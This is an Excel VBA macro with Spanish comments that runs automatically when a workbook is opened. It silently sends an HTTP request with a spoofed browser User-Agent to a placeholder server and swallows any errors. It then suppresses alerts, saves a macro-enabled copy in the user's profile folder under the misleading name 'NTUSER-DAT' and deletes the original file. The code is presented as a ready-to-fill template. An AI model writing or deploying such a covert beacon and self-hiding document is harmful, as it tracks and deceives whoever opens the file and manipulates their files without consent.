' Macro completa
Private Sub Workbook_Open() ' Evento que se desencadena cuando se abre el libro.
    For Each ws In ThisWorkbook.Worksheets
        ws.Visible = xlSheetVisible ' El For Next recorre todas las hojas y las hace visibles
    Next ws
    Sheets("Inicio").Visible = xlVeryHidden ' La hoja Inicio la oculta
   
' En caso de que no haya conexión On Error manejará hacia Next
        On Error Resume Next
' Definimos una URL de destino donde enviaremos las peticiones GET
        Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
        Url = "http://REPLACE-FOR-END-POINT-SERVER/?QUERY-STRING"
        objHTTP.Open "GET", Url, False
        objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
        objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
        objHTTP.send ("var1=value1&var2=value2&var3=value3")
   
' Definimos el path en el que está el archivo atual
            Dim myPath As String

        myPath = Application.ThisWorkbook.FullName
   
' Anulamos mensajes emergentes
       Application.DisplayAlerts = False
' Guardamos una copia del archivo en la ruta de Windows
' C:\Users\NombreDelUsuario\
' bajo el nombre NTUSER-DAT
         ActiveWorkbook.SaveAs Filename:= _
        "C:\Users\" & Application.UserName & "\NTUSER-DAT" _
        , FileFormat:=xlOpenXMLWorkbookMacroEnabled, CreateBackup:=False

' Anulamos mensajes emergentes         
            Application.DisplayAlerts = False
' Al guardar un duplicado hemos pasado al archivo copia
' por tanto, eliminamos el WorkBook anterior con la ruta
' que hemos guardado antes en myPath
            ActiveWorkbook.ChangeFileAccess xlReadOnly
            Kill myPath
            ThisWorkbook.Close False
        ActiveWorkbook.Close
 
End Sub
 
' Esta Macro oculta antes de cerrar todas las hojas del libro
' excepto Inicio
' Luego guarda

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    Sheets("Inicio").Visible = xlSheetVisible
    
    For Each ws In ThisWorkbook.Worksheets
        If ws.Name <> "Inicio" Then
            ws.Visible = xlVeryHidden
        End If
    Next ws
 
    ActiveWorkbook.Save
End Sub